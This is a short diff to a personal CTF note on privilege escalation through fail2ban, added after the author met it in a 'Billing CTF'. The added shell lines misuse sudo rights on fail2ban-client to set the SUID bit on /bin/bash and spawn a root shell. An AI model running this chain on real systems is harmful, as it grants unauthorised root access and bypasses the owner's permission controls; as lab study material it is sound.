@@ -4,3 +4,10 @@ The reason being is, the tool is popular and I encountered it in "Billing CTF" o
 This note will be a watered down howto of what I learned from this lovely article.
 https://juggernaut-sec.com/fail2ban-lpe/
 
+```shell
+sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
+
+sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
+
+/bin/bash -p
+```
